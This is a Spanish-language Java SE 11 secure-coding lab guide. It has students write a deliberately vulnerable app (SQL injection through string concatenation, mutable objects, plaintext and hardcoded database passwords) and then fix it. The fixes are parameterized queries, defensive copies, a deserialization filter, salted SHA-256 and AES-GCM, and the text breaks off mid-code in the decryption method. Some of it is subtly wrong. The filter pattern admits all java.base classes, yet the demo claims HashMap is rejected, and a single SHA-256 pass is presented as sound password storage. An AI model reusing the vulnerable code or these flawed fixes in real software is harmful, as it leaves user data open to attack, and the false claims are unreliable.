# Práctica: Implementación de controles de codificación segura en Java SE 11

## Metadatos

| Campo | Valor |
|---|---|
| **Duración** | 110 minutos |
| **Complejidad** | Alta |
| **Nivel Bloom** | Aplicar |
| **Módulo del curso** | 8 — Seguridad en Java SE 11 |
| **Tecnologías clave** | Java SE 11 (Temurin 11.0.23+9), PostgreSQL 16.3, JDBC 42.7.3, JCA/JCE, Bouncy Castle 1.78.1, SonarLint 10.4.0.79986 |

## Descripción General

El participante revisará una aplicación con vulnerabilidades comunes y aplicará controles de validación de entrada, prevención de inyección SQL mediante consultas parametrizadas con JDBC, copias defensivas, objetos inmutables y construcción segura de objetos. Configurará filtros para una deserialización segura, protegerá datos confidenciales con hashes mediante MessageDigest, cifrado con JCE y firmas digitales, administrará claves y certificados en un KeyStore y asegurará el procesamiento de XML frente a ataques de entidades externas.

## Objetivos de Aprendizaje

- [ ] Identificar vulnerabilidades comunes (inyección SQL, deserialización insegura, mutabilidad expuesta) mediante análisis estático con SonarLint y reemplazar consultas concatenadas por `PreparedStatement` con parámetros posicionales.
- [ ] Aplicar copias defensivas en constructores y getters, construir objetos inmutables con campos `final` y configurar un `ObjectInputFilter` para restringir clases durante la deserialización.
- [ ] Calcular hashes SHA-256 con salt aleatorio, cifrar/descifrar datos con AES/GCM/NoPadding de 256 bits y generar/verificar firmas digitales SHA256withRSA.
- [ ] Crear y administrar un KeyStore PKCS12 con `keytool` y cargarlo programáticamente, y configurar `DocumentBuilderFactory` para prevenir ataques XXE.

## Prerrequisitos

| Tipo | Detalle |
|---|---|
| **Laboratorio previo** | Lab 07-00-01 completado (entorno de desarrollo estable con JDK 11 y Maven) |
| **Base de datos** | PostgreSQL 16.3 ejecutándose en `localhost:5432` |
| **IDE** | IntelliJ IDEA Community Edition 2024.1.4 con SonarLint 10.4.0.79986 instalado |
| **Conocimientos** | SQL básico, JDBC, conceptos de POO, fundamentos de seguridad (Lección 8.1) |
| **Directorio de trabajo** | `~/cursos/java-se11-labs` (Linux/macOS) o `C:\cursos\java-se11-labs` (Windows) |

## Entorno de Laboratorio

### Software requerido

| Componente | Versión exacta | Fuente oficial |
|---|---|---|
| JDK | Eclipse Temurin 11.0.23+9 | https://adoptium.net/temurin/releases/?version=11 |
| Maven | 3.9.8 | https://maven.apache.org/download.cgi |
| PostgreSQL | 16.3 | https://www.postgresql.org/download/ |
| PostgreSQL JDBC Driver | 42.7.3 | https://jdbc.postgresql.org/download/ |
| Bouncy Castle Provider (`bcprov-jdk18on`) | 1.78.1 | https://repo1.maven.org/maven2/org/bouncycastle/bcprov-jdk18on/1.78.1/ |
| SonarLint (IntelliJ plugin) | 10.4.0.79986 | https://plugins.jetbrains.com/plugin/7973-sonarlint |
| IntelliJ IDEA CE | 2024.1.4 | https://www.jetbrains.com/idea/download/ |

### Estructura de directorios del laboratorio

```
~/cursos/java-se11-labs/
├── pom.xml
└── src/main/java/com/securelab/
    ├── model/
    │   ├── User.java
    │   ├── Product.java
    │   └── UserProfile.java
    ├── repository/
    │   ├── UserRepository.java
    │   └── ProductRepository.java
    ├── service/
    │   ├── PasswordService.java
    │   ├── DataEncryptionService.java
    │   └── DocumentSigningService.java
    ├── security/
    │   ├── DeserializationFilter.java
    │   └── XmlSecureProcessor.java
    └── app/
        └── SecureCodingDemo.java
```

## Instrucciones Paso a Paso

### Paso 1: Preparar la base de datos y el proyecto vulnerable

**Objetivo:** Crear la base de datos `secure_lab_db`, ejecutar los scripts de esquema y datos, y configurar el proyecto Maven con las dependencias necesarias.

1. Abre una terminal y conéctate a PostgreSQL para crear la base de datos:

```bash
psql -U postgres -h localhost -p 5432
```

2. Ejecuta los siguientes comandos SQL para crear la base de datos y el usuario:

```sql
CREATE DATABASE secure_lab_db;
CREATE USER securelab WITH PASSWORD 'SecLab2024#';
GRANT ALL PRIVILEGES ON DATABASE secure_lab_db TO securelab;
\q
```

3. Conéctate a la nueva base de datos y crea el esquema:

```bash
psql -U securelab -h localhost -p 5432 -d secure_lab_db
```

```sql
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    salt VARCHAR(64),
    email VARCHAR(100) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE products (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    description TEXT,
    price NUMERIC(10,2) NOT NULL,
    category VARCHAR(50)
);

INSERT INTO users (username, password_hash, email) VALUES
('admin', 'admin123', 'admin@securelab.com'),
('jperez', 'password456', 'jperez@securelab.com'),
('mgarcia', 'qwerty789', 'mgarcia@securelab.com');

INSERT INTO products (name, description, price, category) VALUES
('Laptop Pro', 'Laptop profesional 16GB RAM', 1299.99, 'Electrónica'),
('Teclado Mecánico', 'Teclado mecánico RGB', 89.50, 'Periféricos'),
('Monitor 27"', 'Monitor IPS 4K', 449.00, 'Electrónica'),
('Mouse Ergonómico', 'Mouse inalámbrico ergonómico', 45.99, 'Periféricos');

\q
```

> **Nota:** Observa que las contraseñas están almacenadas en texto plano. Esta es una vulnerabilidad intencional que corregiremos en el Ejercicio 5.

4. Navega al directorio del proyecto y crea la estructura de paquetes:

```bash
cd ~/cursos/java-se11-labs
mkdir -p src/main/java/com/securelab/{model,repository,service,security,app}
mkdir -p src/main/resources
mkdir -p src/test/java/com/securelab
```

5. Agrega las dependencias de seguridad al `pom.xml` existente. Añade dentro de la sección `<dependencies>`:

```xml
<!-- PostgreSQL JDBC Driver -->
<dependency>
    <groupId>org.postgresql</groupId>
    <artifactId>postgresql</artifactId>
    <version>42.7.3</version>
</dependency>

<!-- Bouncy Castle Provider -->
<dependency>
    <groupId>org.bouncycastle</groupId>
    <artifactId>bcprov-jdk18on</artifactId>
    <version>1.78.1</version>
</dependency>
```

6. Verifica que el proyecto compila correctamente:

```bash
mvn compile -q
```

**Salida esperada:** Compilación sin errores (`BUILD SUCCESS`).

**Verificación:** Ejecuta `ls src/main/java/com/securelab/` y confirma que existen los 5 directorios: `model`, `repository`, `service`, `security`, `app`.

---

### Paso 2: Crear la aplicación vulnerable (código base)

**Objetivo:** Escribir el código intencionalmente vulnerable que será analizado y corregido en los ejercicios posteriores.

1. Crea la clase `User.java` en `src/main/java/com/securelab/model/`:

```java
package com.securelab.model;

import java.io.Serializable;
import java.util.Date;
import java.util.List;

// VULNERABLE: Clase mutable con campos expuestos
public class User implements Serializable {
    private static final long serialVersionUID = 1L;

    private int id;
    private String username;
    private String email;

    public User(int id, String username, String email) {
        this.id = id;
        this.username = username;
        this.email = email;
    }

    // Getters y setters (mutabilidad no controlada)
    public int getId() { return id; }
    public void setId(int id) { this.id = id; }
    public String getUsername() { return username; }
    public void setUsername(String username) { this.username = username; }
    public String getEmail() { return email; }
    public void setEmail(String email) { this.email = email; }

    @Override
    public String toString() {
        return "User{id=" + id + ", username='" + username + "', email='" + email + "'}";
    }
}
```

2. Crea la clase `Product.java` en `src/main/java/com/securelab/model/`:

```java
package com.securelab.model;

import java.io.Serializable;
import java.math.BigDecimal;

public class Product implements Serializable {
    private static final long serialVersionUID = 1L;

    private int id;
    private String name;
    private String description;
    private BigDecimal price;
    private String category;

    public Product(int id, String name, String description,
                   BigDecimal price, String category) {
        this.id = id;
        this.name = name;
        this.description = description;
        this.price = price;
        this.category = category;
    }

    public int getId() { return id; }
    public String getName() { return name; }
    public String getDescription() { return description; }
    public BigDecimal getPrice() { return price; }
    public String getCategory() { return category; }

    @Override
    public String toString() {
        return "Product{id=" + id + ", name='" + name +
               "', price=" + price + ", category='" + category + "'}";
    }
}
```

3. Crea la clase `UserProfile.java` con vulnerabilidades de mutabilidad en `src/main/java/com/securelab/model/`:

```java
package com.securelab.model;

import java.util.Date;
import java.util.List;

// VULNERABLE: Expone referencias mutables sin copias defensivas
public class UserProfile {
    private String name;
    private Date birthDate;       // Date es mutable
    private List<String> roles;   // Lista mutable expuesta

    public UserProfile(String name, Date birthDate, List<String> roles) {
        this.name = name;
        this.birthDate = birthDate;   // Sin copia defensiva
        this.roles = roles;           // Sin copia defensiva
    }

    public String getName() { return name; }
    public void setName(String name) { this.name = name; }
    public Date getBirthDate() { return birthDate; }        // Expone referencia
    public void setBirthDate(Date birthDate) { this.birthDate = birthDate; }
    public List<String> getRoles() { return roles; }        // Expone referencia
    public void setRoles(List<String> roles) { this.roles = roles; }
}
```

4. Crea la clase `UserRepository.java` con inyección SQL en `src/main/java/com/securelab/repository/`:

```java
package com.securelab.repository;

import com.securelab.model.User;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;

// VULNERABLE: Concatenación de strings en consultas SQL
public class UserRepository {

    private static final String URL = "jdbc:postgresql://localhost:5432/secure_lab_db";
    private static final String DB_USER = "securelab";
    private static final String DB_PASS = "SecLab2024#";

    public Connection getConnection() throws SQLException {
        return DriverManager.getConnection(URL, DB_USER, DB_PASS);
    }

    // VULNERABLE: Inyección SQL por concatenación
    public User findByUsername(String username) {
        String sql = "SELECT id, username, email FROM users WHERE username = '"
                     + username + "'";
        try (Connection conn = getConnection();
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(sql)) {
            if (rs.next()) {
                return new User(rs.getInt("id"),
                                rs.getString("username"),
                                rs.getString("email"));
            }
        } catch (SQLException e) {
            System.err.println("Error: " + e.getMessage());
        }
        return null;
    }

    // VULNERABLE: Inyección SQL por concatenación
    public List<User> findAll() {
        List<User> users = new ArrayList<>();
        String sql = "SELECT id, username, email FROM users";
        try (Connection conn = getConnection();
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(sql)) {
            while (rs.next()) {
                users.add(new User(rs.getInt("id"),
                                   rs.getString("username"),
                                   rs.getString("email")));
            }
        } catch (SQLException e) {
            System.err.println("Error: " + e.getMessage());
        }
        return users;
    }

    // VULNERABLE: Inyección SQL por concatenación en INSERT
    public boolean insertUser(String username, String passwordHash, String email) {
        String sql = "INSERT INTO users (username, password_hash, email) VALUES ('"
                     + username + "', '" + passwordHash + "', '" + email + "')";
        try (Connection conn = getConnection();
             Statement stmt = conn.createStatement()) {
            return stmt.executeUpdate(sql) > 0;
        } catch (SQLException e) {
            System.err.println("Error: " + e.getMessage());
            return false;
        }
    }
}
```

5. Crea la clase `ProductRepository.java` con inyección SQL en `src/main/java/com/securelab/repository/`:

```java
package com.securelab.repository;

import com.securelab.model.Product;
import java.math.BigDecimal;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;

// VULNERABLE: Concatenación de strings en consultas SQL
public class ProductRepository {

    private static final String URL = "jdbc:postgresql://localhost:5432/secure_lab_db";
    private static final String DB_USER = "securelab";
    private static final String DB_PASS = "SecLab2024#";

    public Connection getConnection() throws SQLException {
        return DriverManager.getConnection(URL, DB_USER, DB_PASS);
    }

    // VULNERABLE: Inyección SQL
    public List<Product> findByCategory(String category) {
        String sql = "SELECT * FROM products WHERE category = '" + category + "'";
        List<Product> products = new ArrayList<>();
        try (Connection conn = getConnection();
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(sql)) {
            while (rs.next()) {
                products.add(new Product(
                    rs.getInt("id"), rs.getString("name"),
                    rs.getString("description"),
                    rs.getBigDecimal("price"), rs.getString("category")));
            }
        } catch (SQLException e) {
            System.err.println("Error: " + e.getMessage());
        }
        return products;
    }

    // VULNERABLE: Inyección SQL
    public Product findByName(String name) {
        String sql = "SELECT * FROM products WHERE name = '" + name + "'";
        try (Connection conn = getConnection();
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(sql)) {
            if (rs.next()) {
                return new Product(
                    rs.getInt("id"), rs.getString("name"),
                    rs.getString("description"),
                    rs.getBigDecimal("price"), rs.getString("category"));
            }
        } catch (SQLException e) {
            System.err.println("Error: " + e.getMessage());
        }
        return null;
    }
}
```

6. Compila el proyecto para verificar que el código vulnerable es sintácticamente correcto:

```bash
mvn compile -q
```

**Salida esperada:** `BUILD SUCCESS`.

**Verificación:** Ejecuta `find src/main/java/com/securelab -name "*.java" | wc -l` y confirma que hay **5 archivos** Java.

---

### Paso 3: Analizar vulnerabilidades con SonarLint (Ejercicio 1)

**Objetivo:** Identificar al menos 5 vulnerabilidades en el código base usando análisis estático con SonarLint.

1. Abre el proyecto `~/cursos/java-se11-labs` en IntelliJ IDEA 2024.1.4.

2. Verifica que SonarLint esté activo: ve a **File → Settings → Plugins** y confirma que **SonarLint 10.4.0.79986** aparece como instalado y habilitado.

3. Abre el archivo `UserRepository.java` en el editor. SonarLint marcará automáticamente las líneas con concatenación SQL. Observa los subrayados y pasa el cursor sobre ellos para leer la descripción de cada hallazgo.

4. Repite el análisis para `ProductRepository.java`, `UserProfile.java` y `User.java`.

5. Ejecuta un análisis completo del proyecto: clic derecho sobre el directorio `com.securelab` → **Analyze → Analyze with SonarLint**.

6. Crea un archivo de documentación con los hallazgos en `src/main/resources/vulnerability-report.md`:

```markdown
## Reporte de Vulnerabilidades — Lab 08

| # | Archivo | Línea | Categoría | Descripción |
|---|---------|-------|-----------|-------------|
| 1 | UserRepository.java | 22 | Inyección SQL | Concatenación de entrada de usuario en consulta SQL |
| 2 | UserRepository.java | 42 | Inyección SQL | INSERT con concatenación de strings |
| 3 | ProductRepository.java | 18 | Inyección SQL | SELECT con concatenación en cláusula WHERE |
| 4 | UserProfile.java | 12 | Mutabilidad | Constructor almacena referencia mutable (Date) sin copia defensiva |
| 5 | UserProfile.java | 18 | Mutabilidad | Getter retorna referencia mutable (List) sin copia defensiva |
| 6 | User.java | 8 | Serialización | Clase Serializable sin validación de deserialización |
| 7 | users (tabla) | — | Criptografía débil | Contraseñas almacenadas en texto plano |
```

**Salida esperada:** SonarLint reporta múltiples hallazgos de seguridad (severity: *Blocker* o *Critical*) relacionados con inyección SQL y mutabilidad.

**Verificación:** El archivo `vulnerability-report.md` contiene al menos 5 vulnerabilidades documentadas con categoría y ubicación.

---

### Paso 4: Prevenir inyección SQL con PreparedStatement (Ejercicio 2)

**Objetivo:** Reemplazar todas las consultas SQL concatenadas por `PreparedStatement` con parámetros posicionales (`?`) en `UserRepository` y `ProductRepository`.

1. Reemplaza el contenido completo de `UserRepository.java`:

```java
package com.securelab.repository;

import com.securelab.model.User;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;

// SEGURO: Todas las consultas usan PreparedStatement
public class UserRepository {

    private static final String URL = "jdbc:postgresql://localhost:5432/secure_lab_db";
    private static final String DB_USER = "securelab";
    private static final String DB_PASS = "SecLab2024#";

    public Connection getConnection() throws SQLException {
        return DriverManager.getConnection(URL, DB_USER, DB_PASS);
    }

    public User findByUsername(String username) {
        String sql = "SELECT id, username, email FROM users WHERE username = ?";
        try (Connection conn = getConnection();
             PreparedStatement pstmt = conn.prepareStatement(sql)) {
            pstmt.setString(1, username);
            try (ResultSet rs = pstmt.executeQuery()) {
                if (rs.next()) {
                    return new User(rs.getInt("id"),
                                    rs.getString("username"),
                                    rs.getString("email"));
                }
            }
        } catch (SQLException e) {
            System.err.println("Error en findByUsername: " + e.getMessage());
        }
        return null;
    }

    public List<User> findAll() {
        List<User> users = new ArrayList<>();
        String sql = "SELECT id, username, email FROM users";
        try (Connection conn = getConnection();
             PreparedStatement pstmt = conn.prepareStatement(sql);
             ResultSet rs = pstmt.executeQuery()) {
            while (rs.next()) {
                users.add(new User(rs.getInt("id"),
                                   rs.getString("username"),
                                   rs.getString("email")));
            }
        } catch (SQLException e) {
            System.err.println("Error en findAll: " + e.getMessage());
        }
        return users;
    }

    public boolean insertUser(String username, String passwordHash,
                              String salt, String email) {
        String sql = "INSERT INTO users (username, password_hash, salt, email) "
                   + "VALUES (?, ?, ?, ?)";
        try (Connection conn = getConnection();
             PreparedStatement pstmt = conn.prepareStatement(sql)) {
            pstmt.setString(1, username);
            pstmt.setString(2, passwordHash);
            pstmt.setString(3, salt);
            pstmt.setString(4, email);
            return pstmt.executeUpdate() > 0;
        } catch (SQLException e) {
            System.err.println("Error en insertUser: " + e.getMessage());
            return false;
        }
    }
}
```

2. Reemplaza el contenido completo de `ProductRepository.java`:

```java
package com.securelab.repository;

import com.securelab.model.Product;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;

// SEGURO: Todas las consultas usan PreparedStatement
public class ProductRepository {

    private static final String URL = "jdbc:postgresql://localhost:5432/secure_lab_db";
    private static final String DB_USER = "securelab";
    private static final String DB_PASS = "SecLab2024#";

    public Connection getConnection() throws SQLException {
        return DriverManager.getConnection(URL, DB_USER, DB_PASS);
    }

    public List<Product> findByCategory(String category) {
        String sql = "SELECT * FROM products WHERE category = ?";
        List<Product> products = new ArrayList<>();
        try (Connection conn = getConnection();
             PreparedStatement pstmt = conn.prepareStatement(sql)) {
            pstmt.setString(1, category);
            try (ResultSet rs = pstmt.executeQuery()) {
                while (rs.next()) {
                    products.add(new Product(
                        rs.getInt("id"), rs.getString("name"),
                        rs.getString("description"),
                        rs.getBigDecimal("price"),
                        rs.getString("category")));
                }
            }
        } catch (SQLException e) {
            System.err.println("Error en findByCategory: " + e.getMessage());
        }
        return products;
    }

    public Product findByName(String name) {
        String sql = "SELECT * FROM products WHERE name = ?";
        try (Connection conn = getConnection();
             PreparedStatement pstmt = conn.prepareStatement(sql)) {
            pstmt.setString(1, name);
            try (ResultSet rs = pstmt.executeQuery()) {
                if (rs.next()) {
                    return new Product(
                        rs.getInt("id"), rs.getString("name"),
                        rs.getString("description"),
                        rs.getBigDecimal("price"),
                        rs.getString("category"));
                }
            }
        } catch (SQLException e) {
            System.err.println("Error en findByName: " + e.getMessage());
        }
        return null;
    }
}
```

3. Compila para verificar la corrección sintáctica:

```bash
mvn compile -q
```

**Salida esperada:** `BUILD SUCCESS`.

**Verificación:** Busca que no queden concatenaciones SQL en los repositorios:

```bash
grep -rn "Statement stmt" src/main/java/com/securelab/repository/
```

Este comando **no debe devolver resultados**. Si aparece alguna línea, aún hay `Statement` sin parametrizar.

---

### Paso 5: Aplicar inmutabilidad y copias defensivas (Ejercicio 3)

**Objetivo:** Refactorizar `UserProfile` para que sea inmutable, con copias defensivas en constructor y getters.

1. Reemplaza el contenido de `UserProfile.java`:

```java
package com.securelab.model;

import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;

// SEGURO: Clase inmutable con copias defensivas
public final class UserProfile {
    private final String name;
    private final Date birthDate;
    private final List<String> roles;

    public UserProfile(String name, Date birthDate, List<String> roles) {
        // Validación de entrada
        if (name == null || name.trim().isEmpty()) {
            throw new IllegalArgumentException("El nombre no puede ser nulo o vacío");
        }
        if (birthDate == null) {
            throw new IllegalArgumentException("La fecha de nacimiento no puede ser nula");
        }
        if (roles == null) {
            throw new IllegalArgumentException("La lista de roles no puede ser nula");
        }

        this.name = name;
        // Copia defensiva: nuevo objeto Date para evitar mutación externa
        this.birthDate = new Date(birthDate.getTime());
        // Copia defensiva: nueva lista para evitar mutación externa
        this.roles = new ArrayList<>(roles);
    }

    public String getName() {
        return name; // String es inmutable, no requiere copia
    }

    public Date getBirthDate() {
        // Copia defensiva en getter: retorna copia, no la referencia interna
        return new Date(birthDate.getTime());
    }

    public List<String> getRoles() {
        // Retorna lista no modificable sobre una copia
        return Collections.unmodifiableList(new ArrayList<>(roles));
    }

    @Override
    public String toString() {
        return "UserProfile{name='" + name + "', birthDate=" + birthDate
               + ", roles=" + roles + "}";
    }
}
```

2. Crea una clase de demostración para verificar la inmutabilidad en `src/main/java/com/securelab/app/ImmutabilityDemo.java`:

```java
package com.securelab.app;

import com.securelab.model.UserProfile;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class ImmutabilityDemo {
    public static void main(String[] args) {
        Date birthDate = new Date(90, 0, 15); // 15-ene-1990
        List<String> roles = new ArrayList<>();
        roles.add("USER");
        roles.add("EDITOR");

        UserProfile profile = new UserProfile("Ana López", birthDate, roles);
        System.out.println("Original: " + profile);

        // Intentar mutar la fecha original
        birthDate.setYear(200);
        System.out.println("Tras mutar fecha externa: " + profile.getBirthDate());

        // Intentar mutar la lista original
        roles.add("ADMIN");
        System.out.println("Tras mutar lista externa: " + profile.getRoles());

        // Intentar mutar la fecha obtenida del getter
        profile.getBirthDate().setYear(150);
        System.out.println("Tras mutar getter fecha: " + profile.getBirthDate());

        // Intentar mutar la lista obtenida del getter
        try {
            profile.getRoles().add("HACKER");
        } catch (UnsupportedOperationException e) {
            System.out.println("Mutación de lista bloqueada: " + e.getClass().getSimpleName());
        }

        System.out.println("Final (sin cambios): " + profile);
    }
}
```

3. Compila y ejecuta:

```bash
mvn compile -q
java -cp target/classes com.securelab.app.ImmutabilityDemo
```

**Salida esperada:**

```
Original: UserProfile{name='Ana López', birthDate=Mon Jan 15 00:00:00 ... 1990, roles=[USER, EDITOR]}
Tras mutar fecha externa: Mon Jan 15 00:00:00 ... 1990
Tras mutar lista externa: [USER, EDITOR]
Tras mutar getter fecha: Mon Jan 15 00:00:00 ... 1990
Mutación de lista bloqueada: UnsupportedOperationException
Final (sin cambios): UserProfile{name='Ana López', birthDate=Mon Jan 15 00:00:00 ... 1990, roles=[USER, EDITOR]}
```

**Verificación:** Ninguna de las mutaciones externas altera el estado interno del objeto `UserProfile`. La fecha permanece en 1990 y la lista mantiene exactamente 2 roles.

---

### Paso 6: Configurar deserialización segura (Ejercicio 4)

**Objetivo:** Implementar un `ObjectInputFilter` que restrinja las clases permitidas durante la deserialización.

1. Crea la clase `DeserializationFilter.java` en `src/main/java/com/securelab/security/`:

```java
package com.securelab.security;

import java.io.*;

public class DeserializationFilter {

    // Patrón de lista blanca: solo clases del paquete com.securelab.model
    private static final String FILTER_PATTERN =
        "com.securelab.model.*;java.base/*;!*";

    /**
     * Deserializa un objeto aplicando un filtro de seguridad.
     * Solo permite clases del paquete com.securelab.model.
     */
    public static Object safeDeserialize(byte[] data) throws IOException, ClassNotFoundException {
        ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(FILTER_PATTERN);

        try (ByteArrayInputStream bais = new ByteArrayInputStream(data);
             ObjectInputStream ois = new ObjectInputStream(bais)) {

            ois.setObjectInputFilter(filter);
            return ois.readObject();
        }
    }

    /**
     * Serializa un objeto a bytes.
     */
    public static byte[] serialize(Object obj) throws IOException {
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(obj);
            return baos.toByteArray();
        }
    }
}
```

2. Crea una clase de prueba `DeserializationDemo.java` en `src/main/java/com/securelab/app/`:

```java
package com.securelab.app;

import com.securelab.model.User;
import com.securelab.security.DeserializationFilter;
import java.util.HashMap;

public class DeserializationDemo {
    public static void main(String[] args) throws Exception {
        // Caso 1: Deserializar clase permitida (User)
        User user = new User(1, "testuser", "test@lab.com");
        byte[] userData = DeserializationFilter.serialize(user);

        try {
            Object result = DeserializationFilter.safeDeserialize(userData);
            System.out.println("Deserialización permitida: " + result);
        } catch (Exception e) {
            System.err.println("Error inesperado: " + e.getMessage());
        }

        // Caso 2: Intentar deserializar clase NO permitida (HashMap)
        HashMap<String, String> malicious = new HashMap<>();
        malicious.put("exploit", "payload");
        byte[] maliciousData = DeserializationFilter.serialize(malicious);

        try {
            Object result = DeserializationFilter.safeDeserialize(maliciousData);
            System.err.println("ERROR: Deserialización debió ser bloqueada");
        } catch (InvalidClassException e) {
            System.out.println("Deserialización bloqueada correctamente: "
                               + e.getMessage());
        }
    }
}
```

3. Compila y ejecuta:

```bash
mvn compile -q
java -cp target/classes com.securelab.app.DeserializationDemo
```

**Salida esperada:**

```
Deserialización permitida: User{id=1, username='testuser', email='test@lab.com'}
Deserialización bloqueada correctamente: filter status: REJECTED
```

**Verificación:** La clase `User` se deserializa correctamente, pero `HashMap` es rechazada por el filtro. Esto demuestra que el `ObjectInputFilter` protege contra clases no autorizadas.

---

### Paso 7: Implementar hashing de contraseñas con SHA-256 y salt (Ejercicio 5)

**Objetivo:** Crear `PasswordService` que calcule hashes SHA-256 con salt aleatorio de 16 bytes y provea verificación segura.

1. Crea `PasswordService.java` en `src/main/java/com/securelab/service/`:

```java
package com.securelab.service;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;

public class PasswordService {

    private static final String ALGORITHM = "SHA-256";
    private static final int SALT_LENGTH = 16; // 16 bytes

    /**
     * Genera un salt aleatorio criptográficamente seguro.
     */
    public byte[] generateSalt() {
        SecureRandom random = new SecureRandom();
        byte[] salt = new byte[SALT_LENGTH];
        random.nextBytes(salt);
        return salt;
    }

    /**
     * Calcula el hash SHA-256 de la contraseña con el salt proporcionado.
     */
    public String hashPassword(String password, byte[] salt) {
        try {
            MessageDigest digest = MessageDigest.getInstance(ALGORITHM);
            digest.reset();
            digest.update(salt);
            byte[] hash = digest.digest(password.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            return bytesToHex(hash);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("Algoritmo no disponible: " + ALGORITHM, e);
        }
    }

    /**
     * Verifica una contraseña contra un hash almacenado.
     * Usa comparación de tiempo constante para evitar ataques de timing.
     */
    public boolean verify(String password, byte[] salt, String storedHash) {
        String computedHash = hashPassword(password, salt);
        return MessageDigest.isEqual(
            computedHash.getBytes(java.nio.charset.StandardCharsets.UTF_8),
            storedHash.getBytes(java.nio.charset.StandardCharsets.UTF_8)
        );
    }

    /**
     * Convierte un arreglo de bytes a su representación hexadecimal.
     */
    public String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }

    /**
     * Convierte una cadena hexadecimal a arreglo de bytes.
     */
    public byte[] hexToBytes(String hex) {
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                                 + Character.digit(hex.charAt(i + 1), 16));
        }
        return data;
    }
}
```

2. Crea la demostración `PasswordDemo.java` en `src/main/java/com/securelab/app/`:

```java
package com.securelab.app;

import com.securelab.service.PasswordService;

public class PasswordDemo {
    public static void main(String[] args) {
        PasswordService service = new PasswordService();

        String password = "MiContraseña$egura2024";

        // Generar salt y hash
        byte[] salt = service.generateSalt();
        String saltHex = service.bytesToHex(salt);
        String hash = service.hashPassword(password, salt);

        System.out.println("Salt (hex):  " + saltHex);
        System.out.println("Hash (hex):  " + hash);
        System.out.println("Salt length: " + salt.length + " bytes");
        System.out.println("Hash length: " + hash.length() + " caracteres hex");

        // Verificar contraseña correcta
        boolean valid = service.verify(password, salt, hash);
        System.out.println("Verificación correcta: " + valid);

        // Verificar contraseña incorrecta
        boolean invalid = service.verify("contraseñaErronea", salt, hash);
        System.out.println("Verificación incorrecta: " + invalid);

        // Demostrar que el mismo password con diferente salt produce hash diferente
        byte[] salt2 = service.generateSalt();
        String hash2 = service.hashPassword(password, salt2);
        System.out.println("Hash con salt diferente: " + hash2);
        System.out.println("Hashes iguales: " + hash.equals(hash2));
    }
}
```

3. Compila y ejecuta:

```bash
mvn compile -q
java -cp target/classes com.securelab.app.PasswordDemo
```

**Salida esperada:**

```
Salt (hex):  <32 caracteres hexadecimales aleatorios>
Hash (hex):  <64 caracteres hexadecimales>
Salt length: 16 bytes
Hash length: 64 caracteres hex
Verificación correcta: true
Verificación incorrecta: false
Hash con salt diferente: <64 caracteres hexadecimales distintos>
Hashes iguales: false
```

**Verificación:** El hash tiene exactamente 64 caracteres hexadecimales (256 bits), la verificación correcta retorna `true`, la incorrecta retorna `false`, y dos salts diferentes producen hashes diferentes para la misma contraseña.

---

### Paso 8: Cifrar y descifrar datos con AES/GCM/NoPadding (Ejercicio 6)

**Objetivo:** Implementar cifrado simétrico AES de 256 bits con modo GCM para datos sensibles, gestionando el IV como parte del mensaje cifrado.

1. Crea `DataEncryptionService.java` en `src/main/java/com/securelab/service/`:

```java
package com.securelab.service;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import java.security.SecureRandom;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class DataEncryptionService {

    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES/GCM/NoPadding";
    private static final int KEY_SIZE = 256;      // bits
    private static final int IV_LENGTH = 12;      // bytes (96 bits, recomendado para GCM)
    private static final int TAG_LENGTH = 128;    // bits (longitud del tag de autenticación)

    /**
     * Genera una clave AES de 256 bits.
     */
    public SecretKey generateKey() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance(ALGORITHM);
        keyGen.init(KEY_SIZE, new SecureRandom());
        return keyGen.generateKey();
    }

    /**
     * Cifra un texto plano. Retorna IV + ciphertext codificado en Base64.
     */
    public String encrypt(String plaintext, SecretKey key) throws Exception {
        byte[] iv = new byte[IV_LENGTH];
        new SecureRandom().nextBytes(iv);

        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        GCMParameterSpec spec = new GCMParameterSpec(TAG_LENGTH, iv);
        cipher.init(Cipher.ENCRYPT_MODE, key, spec);

        byte[] ciphertext = cipher.doFinal(plaintext.getBytes(StandardCharsets.UTF_8));

        // Concatenar IV + ciphertext para transmisión/almacenamiento
        ByteBuffer buffer = ByteBuffer.allocate(IV_LENGTH + ciphertext.length);
        buffer.put(iv);
        buffer.put(ciphertext);

        return Base64.getEncoder().encodeToString(buffer.array());
    }

    /**
     * Descifra un mensaje Base64 que contiene IV + ciphertext.
     */
    public String decrypt(String encryptedBase64, SecretKey key) throws Exception {
        byte[] decoded = Base64.getDecoder().decode(encryptedBase64);

        // Extraer IV (primeros 12 bytes)
        ByteBuffer buffer = ByteBuffer.wrap(decoded);
